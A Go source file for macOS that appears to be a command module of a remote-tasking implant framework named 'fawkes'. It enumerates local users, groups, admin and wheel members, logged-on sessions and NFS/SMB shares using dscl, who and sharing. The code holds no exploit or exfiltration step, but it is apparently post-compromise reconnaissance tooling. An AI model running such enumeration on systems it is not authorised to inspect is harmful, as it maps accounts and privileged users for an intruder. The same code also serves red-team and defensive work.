//go:build darwin
// +build darwin

package commands

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

const neAllActionsDarwin = "users, groups, groupmembers, admins, sessions, shares"

func (c *NetEnumCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[netEnumArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	remoteTimeout := 30 * time.Second
	if args.Timeout > 0 {
		remoteTimeout = time.Duration(args.Timeout) * time.Second
	}
	_ = remoteTimeout

	switch strings.ToLower(args.Action) {
	case "users":
		return neDarwinUsers()
	case "groups", "localgroups":
		return neDarwinGroups()
	case "groupmembers":
		group := args.Group
		if group == "" {
			group = args.Target
		}
		if group == "" {
			return errorf("groupmembers requires -group parameter")
		}
		return neDarwinGroupMembers(group)
	case "admins":
		return neDarwinAdmins()
	case "sessions", "loggedon":
		return neDarwinSessions()
	case "shares":
		return neDarwinShares()
	case "domainusers", "domaingroups", "domaininfo", "mapped":
		return errorf("%s is not available on macOS", args.Action)
	default:
		return errorf("Unknown action: %s\nAvailable: %s", args.Action, neAllActionsDarwin)
	}
}

// neDarwinUsers lists users via dscl.
func neDarwinUsers() structs.CommandResult {
	out, err := exec.Command("dscl", ".", "-list", "/Users", "UniqueID").Output()
	if err != nil {
		return errorf("dscl failed: %v", err)
	}

	var entries []netEnumEntry
	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 2 {
			continue
		}
		name := fields[0]
		uid, _ := strconv.Atoi(fields[1])
		userType := "local_user"
		if uid < 500 && uid != 0 {
			userType = "system_user"
		}
		// Skip system accounts starting with _
		if strings.HasPrefix(name, "_") {
			userType = "system_user"
		}
		entries = append(entries, netEnumEntry{
			Name: name,
			Type: userType,
			UID:  uid,
		})
	}

	data, _ := json.Marshal(entries)
	return successResult(string(data))
}

// neDarwinGroups lists groups via dscl.
func neDarwinGroups() structs.CommandResult {
	out, err := exec.Command("dscl", ".", "-list", "/Groups", "PrimaryGroupID").Output()
	if err != nil {
		return errorf("dscl failed: %v", err)
	}

	var entries []netEnumEntry
	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 2 {
			continue
		}
		name := fields[0]
		gid, _ := strconv.Atoi(fields[1])
		entries = append(entries, netEnumEntry{
			Name: name,
			Type: "local_group",
			GID:  gid,
		})
	}

	data, _ := json.Marshal(entries)
	return successResult(string(data))
}

// neDarwinGroupMembers returns members of a specific group.
func neDarwinGroupMembers(group string) structs.CommandResult {
	out, err := exec.Command("dscl", ".", "-read", fmt.Sprintf("/Groups/%s", group), "GroupMembership").Output()
	if err != nil {
		return errorf("Failed to read group %s: %v", group, err)
	}

	var entries []netEnumEntry
	text := strings.TrimSpace(string(out))
	// Format: "GroupMembership: user1 user2 user3"
	if idx := strings.Index(text, ":"); idx >= 0 {
		members := strings.Fields(text[idx+1:])
		for _, member := range members {
			entries = append(entries, netEnumEntry{
				Name:   member,
				Type:   "group_member",
				Source: group,
			})
		}
	}

	if len(entries) == 0 {
		empty := []netEnumEntry{{Name: group, Type: "info", Comment: "No members found"}}
		data, _ := json.Marshal(empty)
		return successResult(string(data))
	}

	data, _ := json.Marshal(entries)
	return successResult(string(data))
}

// neDarwinAdmins returns members of the admin group.
func neDarwinAdmins() structs.CommandResult {
	adminGroups := []string{"admin", "wheel"}
	var entries []netEnumEntry

	for _, group := range adminGroups {
		out, err := exec.Command("dscl", ".", "-read", fmt.Sprintf("/Groups/%s", group), "GroupMembership").Output()
		if err != nil {
			continue
		}
		text := strings.TrimSpace(string(out))
		if idx := strings.Index(text, ":"); idx >= 0 {
			members := strings.Fields(text[idx+1:])
			for _, member := range members {
				entries = append(entries, netEnumEntry{
					Name:   member,
					Type:   "admin",
					Source: group,
				})
			}
		}
	}

	// Deduplicate
	seen := make(map[string]bool)
	var unique []netEnumEntry
	for _, e := range entries {
		if !seen[e.Name] {
			seen[e.Name] = true
			unique = append(unique, e)
		}
	}

	return successResult(unique)
}

// neDarwinSessions uses the who command for session enumeration.
func neDarwinSessions() structs.CommandResult {
	out, err := exec.Command("who").Output()
	if err != nil {
		return errorf("who failed: %v", err)
	}

	var entries []netEnumEntry
	scanner := bufio.NewScanner(strings.NewReader(string(out)))
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 3 {
			continue
		}
		host := ""
		if len(fields) >= 5 {
			host = strings.Trim(fields[4], "()")
		}
		entries = append(entries, netEnumEntry{
			Name:   fields[0],
			Type:   "loggedon",
			Source: fields[1],
			Client: host,
			Time:   strings.Join(fields[2:4], " "),
		})
	}

	data, _ := json.Marshal(entries)
	return successResult(string(data))
}

// neDarwinShares enumerates NFS exports and AFP shares.
func neDarwinShares() structs.CommandResult {
	var entries []netEnumEntry

	// NFS exports
	if f, err := os.Open("/etc/exports"); err == nil {
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			parts := strings.Fields(line)
			if len(parts) == 0 {
				continue
			}
			entries = append(entries, netEnumEntry{
				Name: parts[0],
				Type: "nfs_export",
			})
		}
		f.Close()
	}

	// SMB shares via sharing command
	if out, err := exec.Command("sharing", "-l").Output(); err == nil {
		scanner := bufio.NewScanner(strings.NewReader(string(out)))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if strings.HasPrefix(line, "name:") {
				name := strings.TrimSpace(strings.TrimPrefix(line, "name:"))
				entries = append(entries, netEnumEntry{
					Name: name,
					Type: "smb_share",
				})
			}
		}
	}

	if len(entries) == 0 {
		empty := []netEnumEntry{{Name: "(none)", Type: "info", Comment: "No NFS exports or SMB shares found"}}
		data, _ := json.Marshal(empty)
		return successResult(string(data))
	}

	data, _ := json.Marshal(entries)
	return successResult(string(data))
}
